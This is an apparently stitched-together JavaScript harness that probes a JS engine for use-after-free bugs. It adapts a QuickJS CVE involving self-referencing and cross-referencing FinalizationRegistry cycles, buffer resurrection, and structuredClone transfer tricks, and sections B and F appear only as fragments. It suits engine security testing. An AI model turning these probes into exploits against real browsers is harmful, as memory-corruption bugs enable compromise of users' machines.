// ============================================================
// SECTION A: FINALIZATIONREGISTRY CYCLE UAF
// Adapted from QuickJS CVE: register a FinalizationRegistry
// as held value of itself, creating a cycle. When GC collects,
// the pending finalization job may reference freed registry.
// ============================================================
async function sectionA(){
  log('warn','=== A: FINALIZATIONREGISTRY CYCLE UAF ===');
  var anomalies=0;

  // A1: Self-referencing registry
  for(var round=0;round<20;round++){
    try{
      var leaked=[];
      var reg=new FinalizationRegistry(function(held){
        // held IS the registry itself — it should be alive
        // If GC collected the cycle, held is dangling
        leaked.push(typeof held);
        try{
          // Try to use the held registry — if freed, this crashes
          held.register({dummy:round},'test-inside');
        }catch(e){
          anomalies++;
          B('A1-CRASH','round:'+round+'|err:'+e.message);
          log('crit','[A1-'+round+'] CRASH using held registry: '+e.message);
        }
      });
      // Register an object with the registry itself as held value
      var target={id:round};
      reg.register(target,reg); // held = reg itself
      target=null; // drop strong ref to trigger finalization
      reg=null; // drop strong ref to registry too — cycle!

      gcPressure(50);
      await sl(20);
    }catch(e){
      B('A1-ERR','round:'+round+'|'+e.message);
    }
  }
  B('A1-SELF','anomalies:'+anomalies);
  log(anomalies>0?'crit':'ok','[A1] Self-ref registry: '+anomalies+'/20');

  // A2: Cross-referencing registries
  for(var round=0;round<15;round++){
    try{
      var regA=new FinalizationRegistry(function(held){
        try{held.register({x:1},'from-A')}catch(e){anomalies++;B('A2-CROSS','round:'+round+'|A-err:'+e.message)}
      });
      var regB=new FinalizationRegistry(function(held){
        try{held.register({x:2},'from-B')}catch(e){anomalies++;B('A2-CROSS','round:'+round+'|B-err:'+e.message)}
      });
      // Cross-register: A holds B, B holds A
      var t1={a:1},t2={b:2};
      regA.register(t1,regB);
      regB.register(t2,regA);
      t1=null;t2=null;regA=null;regB=null;
      gcPressure(80);
      await sl(30);
    }catch(e){
      B('A2-ERR','round:'+round+'|'+e.message);
    }
  }
  B('A2-CROSS-DONE','anomalies:'+anomalies);
  log(anomalies>0?'crit':'ok','[A2] Cross-ref registries: '+anomalies+'/15');

  // A3: Registry that resurrects its target
  for(var round=0;round<15;round++){
    try{
      var resurrected=null;
      var weakRef=null;
      var reg=new FinalizationRegistry(function(held){
        // Resurrect: store the held value globally
        resurrected=held;
      });
      var bigBuf=new ArrayBuffer(1024*1024);
      var view=new BigUint64Array(bigBuf);
      view[0]=0xDEADCAFEBEEFn;
      weakRef=new WeakRef(bigBuf);
      reg.register(bigBuf,bigBuf); // held = target itself
      bigBuf=null;
      gcPressure(100);
      await sl(50);

      if(resurrected){
        // The callback fired and resurrected the buffer
        try{
          var v2=new BigUint64Array(resurrected);
          var val=v2[0];
          if(val!==0xDEADCAFEBEEFn&&val!==0n){
            anomalies++;
            B('A3-STALE','round:'+round+'|val:0x'+val.toString(16));
            log('crit','[A3-'+round+'] STALE data in resurrected buffer: 0x'+val.toString(16));
          }else{
            B('A3-RESURRECTED','round:'+round+'|val:0x'+val.toString(16)+'|len:'+resurrected.byteLength);
          }
        }catch(e){
          anomalies++;
          B('A3-DETACHED','round:'+round+'|'+e.message);
          log('crit','[A3-'+round+'] Resurrected buffer DETACHED: '+e.message);
        }
      }
    }catch(e){
      B('A3-ERR','round:'+round+'|'+e.message);
    }
  }
  B('A3-RESURRECT','anomalies:'+anomalies);

  B('A-DONE','total:'+anomalies);
  log(anomalies>0?'crit':'ok','[A] FinalizationRegistry total: '+anomalies);
  return anomalies;
}

      B('B3-ERR','round:'+round+'|'+e.message);

  B('B3-PROTO','tested');
  log('ok','[B3] Sort+proto pollution: tested');

  B('B-DONE','total:'+anomalies);

          log('crit','[F2-'+round+'] Buffer NOT detached after transfer!');
        }
        // Check if cloned ref has our data
        var cv=new BigUint64Array(cloned.ref.buffer);
        if(cv[0]!==BigInt('0xCAFEBABEDEADBEEF')&&cv[0]!==0n){
          B('F2-STALE','round:'+round+'|val:0x'+cv[0].toString(16));
          log('warn','[F2-'+round+'] Unexpected clone value');
        }
      }catch(e){/* DataCloneError expected when same buffer is both ref'd and transferred */}
    }catch(e){
      B('F2-ERR','round:'+round+'|'+e.message);
    }
  }
  B('F2-TRANSFER','anomalies:'+anomalies);
  log(anomalies>0?'crit':'ok','[F2] Transfer+ref same buffer: '+anomalies+'/20');

  // F3: Deep circular reference + WeakRef interaction
  try{
    var reg=new FinalizationRegistry(function(held){
      B('F3-FINALIZED','held:'+held);
    });

    for(var round=0;round<10;round++){
      var a={name:'a'};
      var b={name:'b',ref_a:a};
      a.ref_b=b;
      // Create WeakRefs to both
      var wa=new WeakRef(a);
      var wb=new WeakRef(b);
      reg.register(a,'obj-a-'+round);
      reg.register(b,'obj-b-'+round);

      // Clone the circular structure
      try{
        var cloned=structuredClone(a);
        // Verify circular ref is preserved
        if(cloned.ref_b.ref_a!==cloned){
          B('F3-BROKEN','round:'+round);
          log('warn','[F3-'+round+'] Circular ref broken in clone');
        }
      }catch(e){}

      // Drop originals
      a=null;b=null;
    }
    gcPressure(50);
    await sl(100);
    B('F3-CIRCULAR','tested');
    log('ok','[F3] Circular clone+WeakRef+FinReg: tested');
  }catch(e){
    B('F3-ERR',e.message);
  }

  B('F-DONE','total:'+anomalies);
  return anomalies;
}
